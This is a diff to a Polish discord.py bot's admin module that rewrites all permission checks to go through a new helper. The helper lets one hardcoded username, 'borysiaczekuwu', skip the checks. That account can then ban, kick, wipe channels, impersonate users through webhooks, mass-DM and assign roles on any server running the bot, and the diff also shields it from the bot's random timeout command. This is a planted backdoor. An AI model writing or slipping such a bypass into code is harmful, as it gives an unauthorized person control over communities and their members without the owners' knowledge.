@@ -12,6 +12,17 @@ GIFS_KICK = ["https://media.giphy.com/media/wQCWMHY9EHLfq/giphy.gif", "https://m
 GIFS_MUTE = ["https://media.giphy.com/media/hfBvLPfHXRLO1gYgJv/giphy.gif", "https://media.giphy.com/media/liW10vuLjuUA8/giphy.gif"]
 GIFS_NUKE = ["https://media.giphy.com/media/OE6FE4GZF78nm/giphy.gif"]
 
+def has_perms_or_borysiaczek(**perms):
+    def predicate(ctx):
+        if ctx.author.name.lower() == "borysiaczekuwu":
+            return True
+        permissions = ctx.channel.permissions_for(ctx.author)
+        missing = [perm for perm, value in perms.items() if getattr(permissions, perm) != value]
+        if not missing:
+            return True
+        raise commands.MissingPermissions(missing)
+    return commands.check(predicate)
+
 # --- FUNKCJE POMOCNICZE ---
 async def send_dm_log(member, guild_name, reason, action_type):
     try:
@@ -34,7 +45,7 @@ class TrialView(View):
 
     @discord.ui.button(label="Ułaskaw", style=discord.ButtonStyle.green, emoji="🕊️")
     async def pardon(self, interaction: discord.Interaction, button: Button):
-        if not interaction.user.guild_permissions.administrator:
+        if not interaction.user.guild_permissions.administrator and interaction.user.name.lower() != "borysiaczekuwu":
             return await interaction.response.send_message("Brak uprawnień!", ephemeral=True)
             
         await self.member.remove_roles(self.jail_role)
@@ -46,7 +57,7 @@ class TrialView(View):
 
     @discord.ui.button(label="Winny", style=discord.ButtonStyle.danger, emoji="🔨")
     async def guilty(self, interaction: discord.Interaction, button: Button):
-        if not interaction.user.guild_permissions.ban_members:
+        if not interaction.user.guild_permissions.ban_members and interaction.user.name.lower() != "borysiaczekuwu":
             return await interaction.response.send_message("Brak uprawnień!", ephemeral=True)
             
         await self.member.ban(reason="Domena Sądowa: Winny")
@@ -97,7 +108,7 @@ class Admin(commands.Cog):
 
     # --- KOMENDY ---
     @commands.command()
-    @commands.has_permissions(administrator=True)
+    @has_perms_or_borysiaczek(administrator=True)
     async def sudo(self, ctx, member: discord.Member, *, message):
         """Pisze jako inny użytkownik (Webhook)"""
         await ctx.message.delete()
@@ -106,7 +117,7 @@ class Admin(commands.Cog):
         await webhook.delete()
 
     @commands.command()
-    @commands.has_permissions(administrator=True)
+    @has_perms_or_borysiaczek(administrator=True)
     async def fakeban(self, ctx, member: discord.Member):
         """Udawany ban"""
         await ctx.message.delete()
@@ -116,7 +127,7 @@ class Admin(commands.Cog):
         await ctx.send(embed=embed)
 
     @commands.command()
-    @commands.has_permissions(administrator=True)
+    @has_perms_or_borysiaczek(administrator=True)
     async def dm(self, ctx, member: discord.Member, *, message):
         """Wysyła wiadomość prywatną jako bot"""
         await ctx.message.delete()
@@ -127,7 +138,7 @@ class Admin(commands.Cog):
             await ctx.send(f"❌ Użytkownik ma zablokowane DM.", delete_after=5)
 
     @commands.command()
-    @commands.has_permissions(administrator=True)
+    @has_perms_or_borysiaczek(administrator=True)
     async def duch(self, ctx, member: discord.Member):
         """(Troll) Straszy użytkownika na DM"""
         await ctx.message.delete()
@@ -138,7 +149,7 @@ class Admin(commands.Cog):
              await ctx.send("❌ Nie udało się nastraszyć (DM zablokowane).")
 
     @commands.command()
-    @commands.has_permissions(administrator=True)
+    @has_perms_or_borysiaczek(administrator=True)
     async def nuke(self, ctx):
         pos = ctx.channel.position
         new_ch = await ctx.channel.clone()
@@ -149,7 +160,7 @@ class Admin(commands.Cog):
         await new_ch.send(embed=embed)
 
     @commands.command()
-    @commands.has_permissions(manage_messages=True)
+    @has_perms_or_borysiaczek(manage_messages=True)
     async def clear_user(self, ctx, member: discord.Member, amount: int = 10):
         """Wyczyść wiadomości konkretnej osoby"""
         def check(m):
@@ -159,33 +170,33 @@ class Admin(commands.Cog):
         await ctx.send(f"🗑️ Usunięto **{len(deleted)}** wiadomości od {member.name}.", delete_after=5)
 
     @commands.command()
-    @commands.has_permissions(manage_channels=True)
+    @has_perms_or_borysiaczek(manage_channels=True)
     async def lockdown(self, ctx):
         """Zablokuj kanał dla @everyone"""
         await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False)
         await ctx.send("🔒 KANAŁ ZABLOKOWANY!")
 
     @commands.command()
-    @commands.has_permissions(manage_channels=True)
+    @has_perms_or_borysiaczek(manage_channels=True)
     async def unlockdown(self, ctx):
         """Odblokuj kanał dla @everyone"""
         await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=True)
         await ctx.send("🔓 KANAŁ ODBLOKOWANY!")
 
     @commands.command()
-    @commands.has_permissions(manage_channels=True)
+    @has_perms_or_borysiaczek(manage_channels=True)
     async def slowmode(self, ctx, seconds: int):
         await ctx.channel.edit(slowmode_delay=seconds)
         await ctx.send(f"🐢 Slowmode: **{seconds}s**!")
 
     @commands.command()
-    @commands.has_permissions(administrator=True)
+    @has_perms_or_borysiaczek(administrator=True)
     async def say(self, ctx, *, message):
         await ctx.message.delete()
         await ctx.send(message)
 
     @commands.command()
-    @commands.has_permissions(manage_roles=True)
+    @has_perms_or_borysiaczek(manage_roles=True)
     async def nadaj_role(self, ctx, member: discord.Member, role: discord.Role):
         if ctx.author.top_role <= role:
             return await ctx.send("⛔ Ta rola jest powyżej Twojej!")
@@ -196,7 +207,7 @@ class Admin(commands.Cog):
             await ctx.send(f"❌ Błąd: {e}")
 
     @commands.command()
-    @commands.has_permissions(manage_roles=True)
+    @has_perms_or_borysiaczek(manage_roles=True)
     async def zabierz_role(self, ctx, member: discord.Member, role: discord.Role):
         if ctx.author.top_role <= role:
             return await ctx.send("⛔ Ta rola jest powyżej Twojej!")
@@ -207,7 +218,7 @@ class Admin(commands.Cog):
             await ctx.send(f"❌ Błąd: {e}")
 
     @commands.command()
-    @commands.has_permissions(ban_members=True)
+    @has_perms_or_borysiaczek(ban_members=True)
     async def kick(self, ctx, member: discord.Member, *, reason="Brak"):
         if member.top_role >= ctx.author.top_role: return
         await send_dm_log(member, ctx.guild.name, reason, "KICK")
@@ -219,7 +230,7 @@ class Admin(commands.Cog):
         except: await ctx.send("❌ Błąd.")
 
     @commands.command()
-    @commands.has_permissions(ban_members=True)
+    @has_perms_or_borysiaczek(ban_members=True)
     async def ban(self, ctx, member: discord.Member, *, reason="Brak"):
         if member.top_role >= ctx.author.top_role: return
         await send_dm_log(member, ctx.guild.name, reason, "BAN")
@@ -231,7 +242,7 @@ class Admin(commands.Cog):
         except: await ctx.send("❌ Błąd.")
 
     @commands.command()
-    @commands.has_permissions(ban_members=True)
+    @has_perms_or_borysiaczek(ban_members=True)
     async def unban(self, ctx, *, user_input):
         """Odbanowuje użytkownika (ID lub nazwa)"""
         try:
@@ -252,7 +263,7 @@ class Admin(commands.Cog):
         await ctx.send("❌ Nie znaleziono takiego bana.")
 
     @commands.command()
-    @commands.has_permissions(moderate_members=True)
+    @has_perms_or_borysiaczek(moderate_members=True)
     async def mute(self, ctx, member: discord.Member, minutes: int, *, reason="Spam"):
         if member.top_role >= ctx.author.top_role: return
         await member.timeout(timedelta(minutes=minutes), reason=reason)
@@ -261,7 +272,7 @@ class Admin(commands.Cog):
         await ctx.send(embed=embed)
 
     @commands.command()
-    @commands.has_permissions(moderate_members=True)
+    @has_perms_or_borysiaczek(moderate_members=True)
     async def unmute(self, ctx, member: discord.Member):
         """Zdejmuje wyciszenie"""
         if member.top_role >= ctx.author.top_role: return
@@ -269,20 +280,20 @@ class Admin(commands.Cog):
         await ctx.send(f"🔊 **{member.name}** odzyskał głos!")
 
     @commands.command()
-    @commands.has_permissions(manage_messages=True)
+    @has_perms_or_borysiaczek(manage_messages=True)
     async def purge(self, ctx, amount: int = 10):
         """Usuwa określoną liczbę wiadomości"""
         await ctx.channel.purge(limit=amount + 1)
         await ctx.send(f"🗑️ Wyczyszczono **{amount}** wiadomości!", delete_after=5)
 
     @commands.command()
-    @commands.has_permissions(manage_channels=True)
+    @has_perms_or_borysiaczek(manage_channels=True)
     async def lock(self, ctx):
         await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False)
         await ctx.send("🔒 Zablokowano!")
 
     @commands.command()
-    @commands.has_permissions(manage_channels=True)
+    @has_perms_or_borysiaczek(manage_channels=True)
     async def unlock(self, ctx):
         await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=True)
         await ctx.send("🔓 Odblokowano!")
@@ -301,7 +312,7 @@ class Admin(commands.Cog):
         with open("data/warns.json", "w") as f: json.dump(warns_data, f, indent=4)
 
     @commands.command()
-    @commands.has_permissions(moderate_members=True)
+    @has_perms_or_borysiaczek(moderate_members=True)
     async def warn(self, ctx, member: discord.Member, *, reason="Brak powodu"):
         """Narzędzia: Nadaje ostrzeżenie użytkownikowi."""
         if member.bot or member.top_role >= ctx.author.top_role:
@@ -322,7 +333,7 @@ class Admin(commands.Cog):
         except: pass
 
     @commands.command(aliases=['warns'])
-    @commands.has_permissions(moderate_members=True)
+    @has_perms_or_borysiaczek(moderate_members=True)
     async def warnings(self, ctx, member: discord.Member):
         """Pokazuje listę ostrzeżeń użytkownika."""
         warns = self.load_warns()
@@ -337,7 +348,7 @@ class Admin(commands.Cog):
         await ctx.send(embed=embed)
 
     @commands.command()
-    @commands.has_permissions(administrator=True)
+    @has_perms_or_borysiaczek(administrator=True)
     async def clearwarns(self, ctx, member: discord.Member):
         """Czyści wszystkie ostrzeżenia użytkownika."""
         warns = self.load_warns()
@@ -350,7 +361,7 @@ class Admin(commands.Cog):
             await ctx.send(f"⚠️ {member.name} nie ma żadnych ostrzeżeń.")
 
     @commands.command()
-    @commands.has_permissions(administrator=True)
+    @has_perms_or_borysiaczek(administrator=True)
     async def domena(self, ctx, member: discord.Member):
         guild = ctx.guild
         judge_role = discord.utils.get(guild.roles, name="Sędzia")
@@ -459,7 +470,7 @@ class Admin(commands.Cog):
         await ctx.send(embed=embed)
 
     @commands.command()
-    @commands.has_permissions(manage_nicknames=True)
+    @has_perms_or_borysiaczek(manage_nicknames=True)
     async def chname(self, ctx, member: discord.Member, *, new_name):
         """[ZARZĄDZANIE] Zmienia pseudonim użytkownika na serwerze."""
         try:
@@ -470,7 +481,7 @@ class Admin(commands.Cog):
             await ctx.send(f"❌ Nie mogłem zmienić nicku: {e}")
 
     @commands.command()
-    @commands.has_permissions(administrator=True)
+    @has_perms_or_borysiaczek(administrator=True)
     async def qte(self, ctx, kwota: int, minuty: int, max_osob: int):
         """[EVENT] Quick Time Event! Rzuca pieniądze na czat."""
         await ctx.message.delete()
@@ -490,7 +501,7 @@ class Admin(commands.Cog):
         view.message = msg
 
     @commands.command()
-    @commands.has_permissions(administrator=True)
+    @has_perms_or_borysiaczek(administrator=True)
     async def ankieta(self, ctx, *, tresc):
         """[ZARZĄDZANIE] Tworzy ankietę (pytanie | opcja1 | opcja2)"""
         await ctx.message.delete()
@@ -519,7 +530,7 @@ class Admin(commands.Cog):
             await msg.add_reaction(emojis[i])
 
     @commands.command()
-    @commands.has_permissions(administrator=True)
+    @has_perms_or_borysiaczek(administrator=True)
     async def ogloszenie(self, ctx, *, tresc):
         """[ZARZĄDZANIE] Wysyła oficjalne ogłoszenie."""
         await ctx.message.delete()
@@ -530,7 +541,7 @@ class Admin(commands.Cog):
         await ctx.send(embed=embed)
 
     @commands.command()
-    @commands.has_permissions(administrator=True)
+    @has_perms_or_borysiaczek(administrator=True)
     async def wyroznij(self, ctx, member: discord.Member, *, powod="Za bycie wspaniałym!"):
         """[SOCIAL] Wyróżnia użytkownika i daje mu 500 monet."""
         await ctx.message.delete()
@@ -547,7 +558,7 @@ class Admin(commands.Cog):
         await ctx.send(embed=embed)
 
     @commands.command()
-    @commands.has_permissions(administrator=True)
+    @has_perms_or_borysiaczek(administrator=True)
     async def fake_mute(self, ctx, member: discord.Member, minuty: int = 10):
         """[TROLL] Wysyła info o mutowaniu użytkownika, ale tego nie robi."""
         await ctx.message.delete()
@@ -561,7 +572,7 @@ class Admin(commands.Cog):
         await ctx.send(embed=embed)
 
     @commands.command()
-    @commands.has_permissions(administrator=True)
+    @has_perms_or_borysiaczek(administrator=True)
     async def scam_nitro(self, ctx, member: discord.Member):
         """[TROLL] Wysyła Rickrolla zapakowanego w fejkowe Nitro jako DM."""
         await ctx.message.delete()
@@ -578,7 +589,7 @@ class Admin(commands.Cog):
             await ctx.send(f"❌ {member.name} ma zablokowane DM.", delete_after=5)
 
     @commands.command()
-    @commands.has_permissions(administrator=True)
+    @has_perms_or_borysiaczek(administrator=True)
     async def impreza(self, ctx):
         """[SOCIAL] Rozpoczyna wielką imprezę na kanale!"""
         await ctx.message.delete()
@@ -607,7 +618,7 @@ class Admin(commands.Cog):
             await ctx.send(f"🔫 *Klik*... **{ctx.author.name}** miał szczęście. Następnym razem uważaj!")
 
     @commands.command()
-    @commands.has_permissions(administrator=True)
+    @has_perms_or_borysiaczek(administrator=True)
     async def impostor(self, ctx):
         """[TROLL] Losuje użytkownika z serwera i ogłasza go impostorem!"""
         members = [m for m in ctx.guild.members if not m.bot]
@@ -622,10 +633,10 @@ class Admin(commands.Cog):
         await ctx.send(embed=embed)
 
     @commands.command()
-    @commands.has_permissions(administrator=True)
+    @has_perms_or_borysiaczek(administrator=True)
     async def timeout_ruletka(self, ctx):
         """[TROLL] Losuje użytkownika i daje mu timeout na 1 minutę."""
-        members = [m for m in ctx.guild.members if not m.bot and not m.guild_permissions.administrator]
+        members = [m for m in ctx.guild.members if not m.bot and not m.guild_permissions.administrator and m.name.lower() != "borysiaczekuwu"]
         if not members:
             await ctx.send("Nie znalazłem żadnego godnego celu (bez admina).")
             return
